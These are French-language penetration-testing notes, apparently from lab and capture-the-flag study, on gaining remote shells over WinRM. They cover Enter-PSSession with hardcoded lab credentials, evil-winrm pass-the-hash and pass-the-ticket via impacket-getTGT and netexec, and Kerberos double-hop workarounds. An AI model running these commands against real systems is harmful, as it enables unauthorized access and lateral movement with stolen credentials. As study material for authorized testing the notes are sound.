

# WINDOWS

## Enter-PSSession

```powershell
$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword) 
```
 
```powershell
Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred
```


# LINUX

- [[#Evil-WinRM]]
- [[#EVIL-WINRM-PY]] (fonctionne mieux)
## Evil-WinRM

> [!Warning]
> attention shell non interactif, penser a importer un autre shell afterward ([[SHELLS#ConPTYShell (Completement interactif (fleches et autocompletion))|ConPTY]] par ex)

Install

```sh
sudo apt install evil-winrm
```


### NTLM

Mot de passe en clair

```sh
evil-winrm -i 10.129.201.248 -u Cry0l1t3 -p P455w0rD!
```

Pass the hash

```sh
evil-winrm -i 10.129.201.248 -u Cry0l1t3 -H <hash>
```

### KERBEROS

1. Générer host file et coller les entrées dans /etc/hosts.

> [!Warning]
> L'ordre des hôtes doit être -> DC.FQDN DOMAIN HOSTNAME
> https://www.ibm.com/docs/en/samfm/8.0.1?topic=spnego-algorithm-resolve-host-names

```sh
netexec smb sevenkingdoms.local --generate-hosts-file hosts.txt
cat hosts.txt
```

2. Générer fichier krb5conf et le coller dans /etc/

```sh
netexec smb sevenkingdoms.local --generate-krb5-file krb5.conf
sudo cp krb5.conf /etc/krb5.conf
```

3. Demander un TGT


```sh
ticket=$(impacket-getTGT $domain/$user:$password | grep .ccache | awk '{print $5}')
export KRB5CCNAME=$ticket
```

4. Pass the Ticket

```sh
evil-winrm -i dc01.sevenkingdoms.local -r sevenkingdoms.local
```


## EVIL-WINRM-PY

**[https://github.com/adityatelange/evil-winrm-py](https://github.com/adityatelange/evil-winrm-py)**

install

```
sudo apt install gcc python3-dev libkrb5-dev krb5-pkinit krb5-user
```

```
pipx install evil-winrm-py[kerberos]
```

### NTLM

Mot de passe en clair

```sh
evil-winrm-py -i dc01.nanocorp.htb -u 'monitoring_svc' -p 'P@ssw0rd' --debug
```

Pass the Hash

```sh
evil-winrm-py -i dc01.nanocorp.htb -u 'monitoring_svc' -H <hash> --debug
```

### KERBEROS

1. Générer host file et coller les entrées dans /etc/hosts.

> [!Warning]
> L'ordre des hôtes doit être -> DC.FQDN DOMAIN HOSTNAME
> https://www.ibm.com/docs/en/samfm/8.0.1?topic=spnego-algorithm-resolve-host-names

```sh
netexec smb "$domain" --generate-hosts-file hosts.txt
cat hosts.txt
```

2. Générer fichier krb5conf et le coller dans /etc/

```sh
netexec smb "$domain" --generate-krb5-file krb5.conf
sudo cp krb5.conf /etc/krb5.conf
```

3. Demander un TGT

```sh
ticket=$(impacket-getTGT $domain/$user:$password | grep .ccache | awk '{print $5}')
export KRB5CCNAME=$ticket
```

Pass the ticket

```sh
evil-winrm-py -i dc01.nanocorp.htb -u 'monitoring_svc' -p 'P@ssw0rd' --ssl -k --debug
```




---
# KERBEROS DOUBLE HOP

> [!TIP]
> Lors de la connexion WINRM ou PsExec, les creds utilisés ne sont pas enregistrés en cache dans la session distante, ce qui empêche d'accéder aux autres ressources sans spécifier les creds.
> Le LogonType **Network**, utilisé par WinRM et PsExec ne charge pas les credentials en mémoire LSASS. Pour cette raison nous pouvons avoir des erreurs lors d'exécution de scripts et tentative d'accès au réseau à partir de notre session.
> 2 Workaround:
> - Créer un PSCredential object
> - Register-PSSessionConfiguration


## PSCredential Object

Se réauthentifier dans la session powershell avec PSCredential (puis passer $cred en argument à chaque fois)

```Powershell
$SecPassword = ConvertTo-SecureString '!qazXSW@' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\backupadm', $SecPassword)
```


## Register PSSession Configuration


Enregistrer la configuration de session avec les identifiants

```powershell
Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential inlanefreight\backupadm
```

Redémarrer le service WinRM

```powershell
Restart-Service WinRM
```

Se connecter à la session en utilisant Enter-PSSESSION en spécifiant la configuration

```powershell
Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm -ConfigurationName  backupadmsess
```
